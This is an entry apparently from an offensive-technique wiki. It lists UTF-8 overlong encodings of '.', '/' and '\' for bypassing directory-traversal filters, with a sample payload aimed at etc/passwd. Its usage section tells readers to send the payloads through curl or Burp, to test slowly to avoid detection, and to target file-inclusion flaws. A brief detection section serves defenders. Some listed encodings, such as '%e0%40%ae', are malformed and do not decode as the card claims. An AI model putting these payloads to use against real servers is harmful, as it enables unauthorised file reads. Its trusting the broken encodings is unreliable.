---
id: 59f3d281-f24c-472a-9141-1fcf5d4b312f
name: UTF-8-Overlong-Encodings-for-Directory-Traversal
type: code
language: plaintext
verified: true
created_at: '2023-04-06T03:55:57.833113+00:00'
updated_at: '2023-04-10T20:22:07.248615+00:00'
platforms:
  - Web
tags:
  - unicode-encoding
  - bypass
validated: true
---

# UTF-8-Overlong-Encodings-for-Directory-Traversal

## Code

```
. = %c0%2e, %e0%40%ae, %c0ae
/ = %c0%af, %e0%80%af, %c0%2f
\ = %c0%5c, %c0%80%5c
```

## Description

This code snippet provides mappings for common directory traversal characters using UTF-8 overlong encodings. These invalid multi-byte sequences decode to standard ASCII characters (., /, \) on the server, allowing bypass of URL decoding filters that block %2e%2e%2f patterns.

## Parameters

| Variable | Description | Example |
|----------|-------------|---------|
| %c0%2e | Overlong encoding for '.' | Used in '.. ' sequences |
| %c0%af | Overlong encoding for '/' | Used for path separators |
| %c0%5c | Overlong encoding for '\' | For Windows paths |

## Usage

Copy these encodings into HTTP requests (e.g., via curl or Burp Suite) to construct traversal payloads like '%c0%af.%c0%af.%c0%afetc%2fpasswd'. Test incrementally to avoid detection. Use in procedures targeting file inclusion vulnerabilities.

## Detection

- WAF logs showing multi-byte UTF-8 sequences in requests.
- Server-side decoding logs revealing overlong UTF-8 (use mod_security or similar to flag).
- Anomalous file access in application logs to system directories.

## Related

- [[procedures/Basic-Directory-Traversal-Using-UTF-8-Unicode-Encoding]]
